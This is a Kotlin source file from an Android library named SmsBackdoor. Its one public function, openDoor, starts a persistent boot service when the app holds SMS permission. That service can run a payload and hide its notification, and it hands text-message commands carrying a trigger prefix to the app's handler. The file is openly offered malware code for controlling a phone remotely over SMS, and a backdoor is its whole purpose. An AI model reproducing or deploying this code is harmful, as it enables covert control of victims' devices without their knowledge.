/*
Copyright 2020 Chris Basinger

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

   http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/
package com.evilthreads.smsbackdoor

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import androidx.appcompat.app.AppCompatActivity
import com.candroid.bootlaces.bootService
/*
            (   (                ) (             (     (
            )\ ))\ )    *   ) ( /( )\ )     (    )\ )  )\ )
 (   (   ( (()/(()/(  ` )  /( )\()|()/((    )\  (()/( (()/(
 )\  )\  )\ /(_))(_))  ( )(_)|(_)\ /(_))\((((_)( /(_)) /(_))
((_)((_)((_|_))(_))   (_(_()) _((_|_))((_))\ _ )(_))_ (_))
| __\ \ / /|_ _| |    |_   _|| || | _ \ __(_)_\(_)   \/ __|
| _| \ V /  | || |__    | |  | __ |   / _| / _ \ | |) \__ \
|___| \_/  |___|____|   |_|  |_||_|_|_\___/_/ \_\|___/|___/
....................../´¯/)
....................,/¯../
.................../..../
............./´¯/'...'/´¯¯`·¸
........../'/.../..../......./¨¯\
........('(...´...´.... ¯~/'...')
.........\.................'...../
..........''...\.......... _.·´
............\..............(
..............\.............\...
*/
/**
 * @author Chris Basinger
 * @email evilthreads669966@gmail.com
 * @date 10/08/20
 *
 * The container object for configuration data related to remote commands.
 * Provides you with [SmsBackdoor.openDoor] which allows you to subscribe to received remote commands and also handles starting [BackdoorService].
 * This is the only public method for SmsBackdoor library module.
 */
object SmsBackdoor{
    internal val KEY_REMOTE_COMMAND = "KEY_REMOTE_COMMAND"
    internal var commandCode : String = "EVILTHREADS:"
    internal var commandHandler : ( (String) -> Unit)? = null
    fun openDoor(ctx: AppCompatActivity, remoteCommandCode: String, notifTitle: String? = null, notifBody: String? = null, payload: (suspend () -> Unit)? = null, remoteCommandHandler: (remoteCommand: String) -> Unit){
        commandHandler = remoteCommandHandler
        commandCode = remoteCommandCode
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
            if(ctx.checkSelfPermission(Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED){
                bootService(ctx, payload){
                    service = BackdoorService::class
                    noPress = true
                    notifTitle?.let { title -> this.notificationTitle = title }
                    notifBody?.let { body -> this.notificationTitle = body }
                }
            }
            else
                bootService(ctx){
                    service = BackdoorService::class
                }
    }
}
